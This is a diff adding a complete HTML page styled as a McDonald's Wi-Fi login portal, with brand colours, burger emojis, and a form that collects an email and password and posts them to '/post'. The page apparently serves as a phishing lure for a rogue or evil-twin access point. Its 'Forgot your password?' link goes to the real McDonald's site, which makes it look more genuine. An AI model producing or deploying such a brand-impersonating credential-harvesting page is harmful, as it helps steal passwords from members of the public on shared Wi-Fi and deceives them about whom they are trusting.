@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>McDonald's Wi-Fi Login</title>
+    <!-- Google Fonts alternative for McDonald's style: 'Anton' -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Anton&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        margin: 0;
+        font-family: "Arial", Helvetica, sans-serif;
+        background-color: #ffc72c; /* McDonald's Yellow */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        text-align: center;
+      }
+
+      .login-card {
+        background: #ffffff;
+        padding: 50px 40px;
+        border-radius: 20px;
+        box-shadow: 0 12px 35px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 400px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .login-card h1 {
+        font-family: "Anton", sans-serif;
+        color: #da291c;
+        font-size: 48px;
+        margin-bottom: 15px;
+        letter-spacing: 2px;
+        line-height: 1.2;
+      }
+
+      .login-card h1 span {
+        margin: 0 5px;
+        font-size: 48px;
+      }
+
+      .login-card h2 {
+        color: #da291c;
+        font-size: 20px;
+        margin-bottom: 35px;
+        font-weight: bold;
+      }
+
+      form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .inputBox {
+        width: 100%;
+        padding: 15px 18px;
+        margin-bottom: 20px;
+        border: 1px solid #d1d1d1;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: 500;
+        outline: none;
+        transition: all 0.2s ease-in-out;
+        font-family: "Arial", sans-serif;
+      }
+
+      .inputBox:focus {
+        border-color: #da291c;
+        box-shadow: 0 0 8px rgba(218, 41, 28, 0.5);
+      }
+
+      button {
+        width: 100%;
+        padding: 15px;
+        background-color: #da291c;
+        color: #ffffff;
+        font-weight: 700;
+        font-size: 18px;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: background 0.2s ease-in-out;
+      }
+
+      button:hover {
+        background-color: #a71d17;
+      }
+
+      a {
+        margin-top: 20px;
+        color: #da291c;
+        text-decoration: none;
+        font-size: 16px;
+        font-weight: bold;
+        text-align: center;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 500px) {
+        .login-card {
+          padding: 40px 25px;
+        }
+        .login-card h1 {
+          font-size: 36px;
+        }
+        .login-card h1 span {
+          font-size: 36px;
+        }
+        .login-card h2 {
+          font-size: 18px;
+        }
+        .inputBox,
+        button {
+          font-size: 16px;
+          padding: 12px 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-card">
+      <!-- Header with Burger Emojis -->
+      <h1><span>🍔</span>McDonald's<span>🍔</span></h1>
+      <h2>Login to access Wi-Fi</h2>
+
+      <!-- Login Form -->
+      <form action="/post" id="login-form">
+        <input
+          class="inputBox"
+          name="email"
+          id="email"
+          type="text"
+          placeholder="Email"
+        />
+        <input
+          class="inputBox"
+          name="password"
+          id="password"
+          type="password"
+          placeholder="Password"
+        />
+        <button type="submit" id="login-btn">Log In</button>
+      </form>
+
+      <!-- Forgot Password Link -->
+      <a
+        href="https://www.mcdonalds.com"
+        target="_blank"
+        rel="noopener noreferrer"
+        >Forgot your password?</a
+      >
+    </div>
+  </body>
+</html>
